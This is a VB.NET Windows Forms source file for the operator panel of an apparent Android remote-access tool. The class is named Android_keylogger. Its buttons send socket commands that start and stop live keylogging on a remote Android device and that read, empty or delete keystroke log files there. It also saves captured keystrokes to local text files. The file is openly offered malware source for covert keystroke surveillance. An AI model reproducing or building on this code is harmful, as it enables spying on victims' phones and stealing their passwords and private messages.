Public Class Android_keylogger
    Public sock As Integer
    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        'Read from combobox
        If ComboBox1.Text.Length > 4 Then 'make sure that config String is focused
            Form1.Server.Send_DX(sock, "key_logger_read" & SplitData & Me.ComboBox1.Text & SplitData)
        End If
        ' 
    End Sub

    Private Sub Button3_Click(sender As System.Object, e As System.EventArgs) Handles Button3.Click
        If Button3.Text.Equals("Disable") Then
            Form1.Server.Send_DX(sock, "key_logger_online_stop")
            Button3.Text = "Enable"
            Label4.Text = "Status : disabled"
        ElseIf Button3.Text.Equals("Enable") Then
            Form1.Server.Send_DX(sock, "key_logger_online_start")
            Button3.Text = "Disable"
            Label4.Text = "Status : enabled [working]"
        End If
    End Sub

    Private Sub Button4_Click(sender As System.Object, e As System.EventArgs) Handles Button4.Click
        'empty logfile content  from combobox
        If ComboBox1.Text.Length > 4 Then 'make sure that config String is focused
            Form1.Server.Send_DX(sock, "key_logger_emptying" & SplitData & Me.ComboBox1.Text & SplitData)
            RichTextBox1.Text = ""
        End If
    End Sub

    Private Sub Button5_Click(sender As System.Object, e As System.EventArgs) Handles Button5.Click
        '
        'delete logfile itself  from combobox
        Dim result As Integer = MessageBox.Show("This will case closing of keylogger form to refresh the new contents" & vbNewLine & "Are you sure to Delete this log file from Android device ?", "Confirm Log Delete", MessageBoxButtons.YesNo, MessageBoxIcon.Question)
        If result = DialogResult.No Then
            Exit Sub
        ElseIf result = DialogResult.Yes Then
            If ComboBox1.Text.Length > 4 Then 'make sure that config String is focused
                Form1.Server.Send_DX(sock, "key_logger_delete" & SplitData & Me.ComboBox1.Text & SplitData)
                Me.Close()
            End If
        End If
       
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        Dim Binded_RICH As New RichTextBox
        If RichTextBox1.Text.Length > 0 Then
            Binded_RICH.AppendText("OFFLINE Saved LOG FILE : " & ComboBox1.Text & vbNewLine)
            Binded_RICH.AppendText(RichTextBox1.Text & vbNewLine & "END of OFFLINE CONTENT")
        End If
        If RichTextBox2.Text.Length > 0 Then
            Binded_RICH.AppendText("ONLINE Saved LOG " & vbNewLine)
            Binded_RICH.AppendText(RichTextBox2.Text & vbNewLine & "END of ONLINE CONTENT")
        End If
        If SaveFileDialog1.ShowDialog = Windows.Forms.DialogResult.OK Then
            If SaveFileDialog1.CheckFileExists = True Then
                SaveFileDialog1.FileName &= " [1].txt"
                Try
                    Binded_RICH.SaveFile(SaveFileDialog1.FileName, RichTextBoxStreamType.PlainText)
                Catch ex As Exception
                    MsgBox("Error Save Exception : " & ex.Message, MsgBoxStyle.Critical)
                End Try
            Else
                SaveFileDialog1.FileName &= ".txt"
                Try
                    Binded_RICH.SaveFile(SaveFileDialog1.FileName, RichTextBoxStreamType.PlainText)
                Catch ex As Exception
                    MsgBox("Error Save Exception : " & ex.Message, MsgBoxStyle.Critical)
                End Try
            End If
        End If
    End Sub
End Class